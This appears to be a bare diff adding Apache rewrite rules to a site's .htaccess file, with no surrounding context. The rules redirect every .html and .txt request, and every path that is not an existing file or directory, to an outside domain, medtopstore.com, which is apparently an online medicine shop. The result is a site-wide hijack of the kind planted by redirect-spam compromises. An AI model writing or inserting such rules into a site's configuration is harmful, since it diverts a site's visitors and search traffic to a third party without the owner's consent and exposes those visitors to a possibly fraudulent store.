@@ -1,0 +1,5 @@
+RewriteRule ^([A-Za-z0-9-]+).html$ https://medtopstore.com/ [L]
+RewriteRule ^([A-Za-z0-9-]+).txt$ https://medtopstore.com/ [L]
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteRule . https://medtopstore.com/ [L]
